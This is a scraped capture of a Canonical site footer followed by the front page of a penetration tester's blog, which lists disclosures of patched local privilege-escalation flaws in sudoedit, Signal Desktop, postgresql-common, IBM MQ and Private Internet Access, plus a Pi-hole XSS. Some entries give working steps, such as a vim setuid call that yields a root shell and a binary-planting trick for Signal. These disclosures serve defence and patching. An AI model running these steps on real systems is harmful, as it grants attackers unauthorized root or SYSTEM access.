## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

¬© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from blog.mirch.io_876decba_20250121_014558.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[Exploiting Kaseya Unitrends Backup Appliance ‚Äì Part¬†1 ‚Äî May 20, 2022](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/ "Exploiting Kaseya Unitrends Backup Appliance ‚Äì Part¬†1")

## [Exploiting Kaseya Unitrends Backup Appliance ‚Äì Part¬†1](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/)

[May 20, 2022May 20, 2022](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/ "9:50 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

![](https://blog.mirch.io/wp-content/uploads/2022/05/unitrends-woot.png?w=889)

In 2021 I discovered several high and critical vulnerabilities in the [Kaseya Unitrends](https://www.unitrends.com/products/unitrends-backup-appliances) backup appliance. This research was conducted and published as part of my day job. Part one details a chain of vulnerabilities by leveraging an insecure [PostgreSQL](https://www.postgresql.org/) database to ultimately gain shell access to the remote server. Visit <https://www.cyberonesecurity.com/blog/exploiting-kaseya-unitrends-backup-appliance-part-1> for the the full write-up. Stay tuned for part two.

[sudoedit symlink fix for CVE-2021-23240 introduced new¬†vulnerability ‚Äî January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "sudoedit symlink fix for CVE-2021-23240 introduced new¬†vulnerability")

[![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=712)](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "sudoedit symlink fix for CVE-2021-23240 introduced new¬†vulnerability")

## [sudoedit symlink fix for CVE-2021-23240 introduced new¬†vulnerability](https://blog.mirch.io/2021/01/25/sudoedit-lpe/)

[January 25, 2021January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "8:43 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I noticed the following changelog entry in sudo [1.9.5p1.](https://www.sudo.ws/stable.html#1.9.5p1) This caught my attention so I decided to look further. I was unable to find an advisory, PoC, or CVE for this vulnerability. Using the details from the changelog message and fix, I decided to write an exploit for it.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image.png?w=1024)

Using an Ubuntu 20.04.1 VM, I created a low privileged user named ‚Äúlowpriv‚Äù and added a sudoedit rule for a root owned file /etc/test.txt. I also downloaded the [source](https://github.com/sudo-project/sudo/archive/SUDO_1_9_5.tar.gz) for sudo 1.9.5, compiled it, and installed it to /opt/sudo.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-3.png?w=1024)

Show sudoedit rule.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-1.png?w=1024)

Show the sudo version is 1.9.5.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-2.png?w=1024)

With the test environment ready I ran sudoedit /etc/test.txt. I executed !id as a quick test which executes the id command in a shell however privileges are dropped by bash when the UID != EUID. Back to the drawing board.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-5.png?w=1024)

I was able to successfully edit arbitrary files simply using the :e /etc/sudoers or :e /etc/shadow commands to escalate privileges, however that was too easy.

Looking for esoteric features that could potentially be leveraged, I discovered the libcall and libcallnr functions which allow you to execute a function from an external library. The one caveat is there can only be a single argument. There are a crazy amount of functions available to vim that I never realized. Check out <https://vim.help/41-write-a-vim-script#41.6> for the full listing.

I tried calling a variety of functions with varying degrees of success but found a simple method by calling [setuid()](https://man7.org/linux/man-pages/man2/setuid.2.html) directly.

`call libcallnr("libc.so.6","setuid",0)`

After running sudoedit, use the following vim/ex command to change the UID to zero. This will ensure that shelling out will retain privileges because now UID==EUID.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-8.png?w=1024)

Execute a bash shell with !bash.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-9.png?w=198)

Interactive root shell obtained. Woot!

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=1024)

I tested the same proof of concept with 1.9.5p1 and sudoedit properly drops privileges as expected.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-11.png?w=1024)

**Summary**

If you upgraded to sudo 1.9.5 to fix [CVE-2021-23240](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23240) or [CVE-2021-23239](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23239), a new privilege escalation vulnerability was introduced in sudoedit and you should upgrade to 1.9.5p1.

Once in a while I look at recently fixed vulnerabilities to see if I can bypass the fix. In this case, the sudo project knew about this vulnerably but to my knowledge no advisory or CVE was created. I think this is odd that the issue was not communicated since a valid privilege escalation was patched. It‚Äôs unclear if another researcher reported it or if maintainers discovered it during their own testing. I also could not find a proof of concept so I decided to write one as a fun exercise.

I hope you enjoyed the short write up. Hit me me up on Twitter [@0xm1rch](https://twitter.com/0xm1rch) if you have any questions or comments.

[Pi-hole Patches Critical Stored XSS¬†Vulnerability ‚Äî December 24, 2020](https://blog.mirch.io/2020/12/24/pihole-xss/ "Pi-hole Patches Critical Stored XSS¬†Vulnerability")

[![](https://blog.mirch.io/wp-content/uploads/2020/12/piholexss.png?w=641)](https://blog.mirch.io/2020/12/24/pihole-xss/ "Pi-hole Patches Critical Stored XSS¬†Vulnerability")

## [Pi-hole Patches Critical Stored XSS¬†Vulnerability](https://blog.mirch.io/2020/12/24/pihole-xss/)

[December 24, 2020December 24, 2020](https://blog.mirch.io/2020/12/24/pihole-xss/ "10:03 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Pi-hole v5.2.1 is vulnerable to a critical stored cross site scripting vulnerability. An attacker with the ability to directly or indirectly query DNS with a malicious hostname can cause arbitrary JavaScript to execute when the Pi-hole administrator accesses the Query Log or Long-term Query Log pages on the web portal.

The Pi-hole project released a fix on 12/24/2020 in v5.2.2. Shodan reports over 7,500 Pi-hole instances. This could be remotely exploited if these instances permit external DNS queries. Other possibilities may exist if a malformed DNS query is allowed.

No payloads are being published at this time to give users time to patch.

**References**

* <https://github.com/pi-hole/AdminLTE/pull/1665>

**Timeline**

* 12/16/2020 Vulnerability reported to vendor
* 12/18/2020 Vendor acknowledged receipt of report
* 12/22/2020 Discovered a second XSS payload that would fire on the Long-term Queries Page
* 12/23/2020 Mitre assigns CVE-2020-35659
* 12/24/2020 Vendor released fix in v5.2.2

[Metasploit module developed for CVE-2018-18556 VyOS Privilege¬†Escalation ‚Äî September 25, 2020](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/ "Metasploit module developed for CVE-2018-18556 VyOS Privilege¬†Escalation")

## [Metasploit module developed for CVE-2018-18556 VyOS Privilege¬†Escalation](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/)

[September 25, 2020September 25, 2020](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/ "3:52 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Today, a Metasploit module was merged for a vulnerability I found in 2018 with [VyOS](https://www.vyos.io/). This vulnerability was my first public InfoSec blog post. I appreciate [bcoles](https://github.com/bcoles) for developing the [exploit/linux/ssh/vyos\_restricted\_shell\_privesc](https://github.com/rapid7/metasploit-framework/pull/14123) module. Read the [Metasploit Wrapup for 9/25/2020](https://blog.rapid7.com/2020/09/25/metasploit-wrap-up-80/). The full write-up can can be found on this blog at [C](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/)[VE-2018-18556 ‚Äì VyOS Privilege escalation via sudo pppd for operator¬†users](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/).

[Critical Vulnerabilities Discovered in MoFi¬†Routers ‚Äî September 2, 2020](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/ "Critical Vulnerabilities Discovered in MoFi¬†Routers")

## [Critical Vulnerabilities Discovered in MoFi¬†Routers](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/)

[September 2, 2020](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/ "1:08 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I discovered several vulnerabilities in the MoFi4500 LTE router. Several vulnerabilities have not been patched, including an unauthenticated remote command injection and several undocumented backdoors. The full write-up can be viewed at <https://www.criticalstart.com/critical-vulnerabilities-discovered-in-mofi-routers/>.

Media Coverage

* <https://www.cyberscoop.com/mofi-networks-routers-zero-day-critical-start/>
* <https://www.zdnet.com/article/backdoors-left-unpatched-in-mofi-routers/>

Follow the conversation on Twitter

> The team is at it again! This time with 10 [#0days](https://twitter.com/hashtag/0days?src=hash&ref_src=twsrc%5Etfw) found by [@0xm1rch](https://twitter.com/0xm1rch?ref_src=twsrc%5Etfw) for routers from [@MoFiNetwork](https://twitter.com/MoFiNetwork?ref_src=twsrc%5Etfw). After coordinating with others to reduce impact there still appears to be over 6,860 vulnerable devices externally facing.[#Infosec](https://twitter.com/hashtag/Infosec?src=hash&ref_src=twsrc%5Etfw) [#redteam](https://twitter.com/hashtag/redteam?src=hash&ref_src=twsrc%5Etfw)<https://t.co/1A1UgRmJrq> [pic.twitter.com/YKPiF4LFMq](https://t.co/YKPiF4LFMq)
>
> ‚Äî TeamARES (@TeamAresSec) [September 2, 2020](https://twitter.com/TeamAresSec/status/1301200248417775618?ref_src=twsrc%5Etfw)

[CVE-2020-3950 VMware Fusion Elevation of¬†Privilege ‚Äî March 17, 2020](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "CVE-2020-3950 VMware Fusion Elevation of¬†Privilege")

[![](https://blog.mirch.io/wp-content/uploads/2020/03/vmware-fusion-cve-2020-3950-cropped.png?w=712)](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "CVE-2020-3950 VMware Fusion Elevation of¬†Privilege")

## [CVE-2020-3950 VMware Fusion Elevation of¬†Privilege](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/)

[March 17, 2020April 3, 2020](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "10:55 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

VMware Fusion 11.5.~~1~~2 and prior are vulnerable to an elevation of privilege vulnerability. For more details please review the advisory and proof of concept on my Github page [CVE-2020-3950.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2020-3950.sh). VMware released a the patch last week and a public advisory [VMSA-2020-0005](https://www.vmware.com/security/advisories/VMSA-2020-0005.html) today however it has been determined that the patch does not properly fix the vulnerability. I reached out to the VMware security team and received a response at 10:31 UTC 2020-03-18 ‚Äì ‚ÄúWe are aware of the situation and working on the next steps‚Äù.

I also learned today that [Jeff Ball](https://twitter.com/jeffball55) at [GRIMM](https://twitter.com/grimmcyber) also independently discovered and reported the vulnerability to VMware.¬† This is a first for me. Make sure to read their excellent detailed write-up <https://blog.grimm-co.com/post/analyzing-suid-binaries/>. You can also follow the thread on Twitter.

> PoC for CVE-2020-3950 VMware Fusion EoP. <https://t.co/F0jGnE9BZu> Vendor Advisory: <https://t.co/28f3aoAFsG> [pic.twitter.com/5WYG9xg5cv](https://t.co/5WYG9xg5cv)
>
> ‚Äî Rich Mirch (@0xm1rch) [March 17, 2020](https://twitter.com/0xm1rch/status/1240030085450731521?ref_src=twsrc%5Etfw)

### **Related Articles**

* BleepingComputer [VMware Fixes High Severity Privilege Escalation Bug in Fusion](https://www.bleepingcomputer.com/news/security/vmware-fixes-high-severity-privilege-escalation-bug-in-fusion/)
* ZDNet [VMware patches privilege escalation vulnerability in Fusion, Horizon](https://www.zdnet.com/article/vmware-patches-privilege-escalation-vulnerability-in-workstation-fusion-horizon/)
* SecurityWeek [VMware Fixes Privilege Escalation Vulnerability in Fusion for Mac](https://www.securityweek.com/vmware-fixes-privilege-escalation-vulnerability-fusion-mac)
* SecurityWeek [Patch for Recently Disclosed VMware Fusion Vulnerability Incomplete](https://www.securityweek.com/recent-patch-vmware-fusion-vulnerability-incomplete)
* SecurityWeek [VMware Again Fails to Patch Privilege Escalation Vulnerability in Fusion](https://www.securityweek.com/vmware-again-fails-patch-privilege-escalation-vulnerability-fusion)
* Metasploit Module [Blown up by your own Fusion bomb](https://blog.rapid7.com/2020/04/03/metasploit-wrap-up-58/)

[CVE-2019-19954 Signal Desktop Windows Elevation of Privilege¬†Vulnerability ‚Äî December 18, 2019](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "CVE-2019-19954 Signal Desktop Windows Elevation of Privilege¬†Vulnerability")

## [CVE-2019-19954 Signal Desktop Windows Elevation of Privilege¬†Vulnerability](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/)

[December 18, 2019August 6, 2020](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "7:25 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

Signal Desktop v1.29 on Windows is vulnerable to an elevation of privilege vulnerability. During the startup the application will execute the c:\node\_modules\.bin\wmic.exe binary if it exists. By default on Windows, low privileged users have the privilege to create folders under root level drives. A low privileged user can create a malicious wmic.exe which will be executed every time Signal Desktop starts by any user of the system. The malicious binary is executed in the background without the users knowledge. This is an example of horizontal [privilege escalation](https://en.wikipedia.org/wiki/Privilege_escalation).

The vulnerability has been patched in v1.29.1 in commit [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688) which was released 12/17/2019. Kudos to the Signal security team for fixing in less than two weeks! Unfortunately, at this time the they do not feel this warrants an advisory or CVE so the vulnerability was silently fixed. **12/24/2019 Update:** Mitre assigned CVE-2019-19954

## Steps To Reproduce

In a cmd window

```
mkdir c:\node_modules\.bin
copy c:\windows\system32\calc.exe c:\node_modules\.bin\wmic.exe

```

Now any user that opens Signal, the Windows calculator will be popped.

## PoC

![signal-lpe-3](https://blog.mirch.io/wp-content/uploads/2020/08/signal-lpe-3.png)

## Timeline

* 2019-12-05: Report sent to Signal security team
* 2019-12-11: Reached out to Signal to verify report was received
* 2019-12-16: Signal acknowledges report
* 2019-12-17: Signal v1.29.1 released
* 2019-12-18: Published this blog post
* 2019-12-24: MITRE assigned CVE-2019-19954

## References

* Commit: [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688)
* Vulnerable version: <https://updates.signal.org/desktop/signal-desktop-win-1.29.0.exe>

[CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg\_ctlcluster ‚Äî November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg_ctlcluster")

[![](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg_ctlcluster")

## [CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg\_ctlcluster](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)

[November 15, 2019November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "6:54 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

The [pg\_ctlcluster](https://manpages.debian.org/buster/postgresql-common/pg_ctlcluster.1.en.html) script in the postgresql-common package in Debian and Ubuntu is vulnerable to a local privilege escalation attack. pg\_ctlcluster is a script used to manage PostgreSQL instances.¬†A malicious actor with access to the postgres account can create arbitrary directories during startup or reload when called via systemd. This vulnerability can be leveraged to escalate privileges to root.

It‚Äôs important to note this is not a vulnerability in PostgreSQL and is specific to Debian, Ubuntu, or any system that consumes the Debian postgresql-common package.

A [fix](https://salsa.debian.org/postgresql/postgresql-common/commit/ec9d984b62ed79f61be97b786a9ff4381309979c)¬†is now available. Administrators should upgrade to the latest version of the postgresql-common package. See the Debian [security tracker](https://security-tracker.debian.org/tracker/source-package/postgresql-common) for details.

The vulnerability appears to have existed since 2013 based on the Debian Git history ([9dc97b,](https://salsa.debian.org/postgresql/postgresql-common/commit/9dc97be33f1f116ae6e2f17bd05cb6a2baf274a9)¬†[e97d16](https://salsa.debian.org/postgresql/postgresql-common/commit/e97d163c85c6df7e30ecc346eec007da2cd7e688)). I attempted to reproduce it on Wheezy but was unable to verify it due to unrelated technical issues standing up a test environment.

This proof of concept will show the ability to gain root privileges using the default

installation of¬† postgresql-common v200+deb10u2 along with postgresql-11 on Debian Buster. I have also verified the vulnerability on Ubuntu 19.04 with version 199 of the postgresql-common package.

---

## Walkthrough

The postgresql init script(/etc/init.d/postgresql) sources¬†[init.d-functions](https://salsa.debian.org/postgresql/postgresql-common/blob/master/debian/init.d-functions) which contain functions that call the pg\_ctlcluster script.¬†pg\_ctlcluster loads the following configuration files determined by the [Pgcommon](https://salsa.debian.org/postgresql/postgresql-common/blob/master/PgCommon.pm)¬†module.

* /etc/postgresql/cluster-version/cluster-name/pg\_ctl.conf
* /etc/postgresql/cluster-version/cluster-name/postgresql.conf
* /var/lib/postgresql/cluster-version/cluster-name/postgresql.auto.conf

These files are owned by the postgres user. The postgresql.auto.conf file will override the settings from /etc/postgresql. This file is created when the [alter system](https://www.postgresql.org/docs/current/sql-altersystem.html) command is executed.

pg\_ctlcluster contains logic to create directories for socketdir(defined in pg\_ctl.conf) and stats\_temp\_directory(defined in postgresql.conf). During a start or reload, if the directories defined in either of these variables do not exist, pg\_ctlcluster will create it and set the owner to the postgres user.

[Continue reading ‚Üí](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/#more-333)

[CVE-2018-1792 ‚Äì IBM MQ Privilege Escalation: Fun with¬†RUNPATH ‚Äî August 25, 2019](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "CVE-2018-1792 ‚Äì IBM MQ Privilege Escalation: Fun with¬†RUNPATH")

[![](https://blog.mirch.io/wp-content/uploads/2019/08/mqm-woot-4.png?w=712)](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "CVE-2018-1792 ‚Äì IBM MQ Privilege Escalation: Fun with¬†RUNPATH")

## [CVE-2018-1792 ‚Äì IBM MQ Privilege Escalation: Fun with¬†RUNPATH](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/)

[August 25, 2019August 25, 2019](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "11:37 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")/[Leave a comment](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/#respond)

# Vulnerability Summary

[IBM MQ](https://en.wikipedia.org/wiki/IBM_MQ)¬†for Linux and UNIX systems is vulnerable to a privilege escalation attack by forcing a setuid root binary to load a malicious library. A local attacker with access to the mqm account can execute arbitrary code as root. In October 2018 IBM published an [advisory](https://www-01.ibm.com/support/docview.wss?uid=ibm10734447)¬†along with patches for several versions.

The goal of this post is to show how the [RPATH/RUNPATH](https://en.wikipedia.org/wiki/Rpath)¬†value could potentially be leveraged for privilege escalation. When specified at compile time this path is embedded in the binary and is the first path searched when searching for a library if the dependent library specified does contain a slash. Details on how this works can be found in the [ld.so](http://man7.org/linux/man-pages/man8/ld.so.8.html)¬†man page.

As with most file path type vulnerabilities, if you control the path, you may control the application in some way. In this case the mqm user is the owner of the directories listed in the RUNPATH.

---

## Walkthrough

List setuid root applications.

```
[mqm@localhost]$ find /opt/mqm -perm -4000 -user root|xargs ls -l
-r-sr-x---. 1 root mqm 13384 Jul 9 07:09 /opt/mqm/bin/security/amqoamax
-r-sr-x---. 1 root mqm 13704 Jul 9 07:09 /opt/mqm/bin/security/amqoampx

```

Use¬†[readelf](http://man7.org/linux/man-pages/man1/readelf.1.html)¬†to read the dynamic section to extract the RPATH/RUNPATH.

```
[mqm@localhost ~]$ readelf -d /opt/mqm/bin/security/amqoamax |grep -e RPATH -e RUNPATH
0x000000000000001d (RUNPATH) Library runpath: [/opt/mqm/lib64:/opt/mqm/gskit8/lib64:/

```

Using my favorite utility [strace](http://man7.org/linux/man-pages/man1/strace.1.html), we can see the open() calls for libm.so.6 fails with ENOENT under /opt/mqm/lib64 and /opt/mqm/gskit8.¬† We‚Äôre using libm.so.6 for this PoC but other libraries can be used. The dependency is ultimately resolved at /usr/lib64/libm.so.6. This gets interesting because the mqm user owns the directories under /opt/mqm.

```
[mqm@localhost ~]$ strace -f /opt/mqm/bin/security/amqoamax 2>&1|grep libm.so
open("/opt/mqm/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/opt/mqm/gskit8/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/usr/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = 3

```

[Continue reading ‚Üí](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/#more-165)

[CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL¬†Engine ‚Äî June 10, 2019](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL¬†Engine")

[![](https://blog.mirch.io/wp-content/uploads/2019/06/woot-cmd.png?w=659)](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL¬†Engine")

## [CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL¬†Engine](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/)

[June 10, 2019June 20, 2019](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "7:13 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")/[1 Comment](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/#comments)

## **Vulnerability Summary**

During startup the PIA Windows service(pia-service.exe) loads the OpenSSL library from C:\Program Files\Private Internet Access\libeay32.dll. This library attempts to load the C:\etc\ssl\openssl.cnf configuration file. By default on Windows systems, authenticated users can create directories under C:\. A low privileged user can create a openssl.cnf configuration file to load a malicious OpenSSL engine library resulting in the arbitrary code execution as SYSTEM when the service starts.

The root cause is when the OpenSSL libraries were built, the [OPENSSLDIR](https://wiki.openssl.org/index.php/Compilation_and_Installation#PREFIX_and_OPENSSLDIR)¬†parameter was set to a path which a low privileged user can modify or create. I believe this issue is lurking in many Window applications that bundle OpenSSL libraries. I have discovered the same vulnerability in several other Windows applications and will be disclosing those findings when patches are available.

I created a simple tool to help identify potentially vulnerable OpenSSL libraries ‚Äì<https://github.com/mirchr/openssldir_check>.

CVE-2019-12572 has been patched in v1.2.1. The latest Windows desktop client can be upgraded automatically via the application or manually from the download page at [Private Internet Access](https://www.privateinternetaccess.com/pages/download).

---

### **Walkthrough**

While hunting for potential vulnerabilities in the Windows Private Internet Access desktop application I noticed a failed call to open the c:\etc\ssl\openssl.cnf file during the service startup.

![pia-openssl-failed-open](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-failed-open.png)

This caught my attention and I needed to research this further. But before I get into the details of that, let‚Äôs take a step back and see how I arrived there.

[Continue reading ‚Üí](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/#more-259)

## Posts navigation

[Older posts](https://blog.mirch.io/page/2/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2022%252F05%252F20%252Fexploiting-kaseya-unitrends-backup-appliance-part-1%252F)
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2022%252F05%252F20%252Fexploiting-kaseya-unitrends-backup-appliance-part-1%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io)
  + [View site in Reader](https://wordpress.com/read/feeds/161645119)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

